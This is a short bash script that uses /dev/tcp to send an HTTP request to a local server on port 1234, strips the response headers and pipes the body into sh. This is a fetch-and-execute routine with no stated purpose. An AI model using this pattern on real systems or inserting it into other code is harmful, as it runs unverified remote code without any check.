
#!/bin/bash

#read proto server path <<<$(echo ${1//// })
exec 3<> /dev/tcp/127.0.0.1/1234
echo -en "GET /$1 HTTP/1.0\r\nHost: 127.0.0.1:1234\r\n\r\n" >&3
(while read line; do
	[[ "$line" == $'\r' ]] && break
	done && cat ) <&3 | sh 
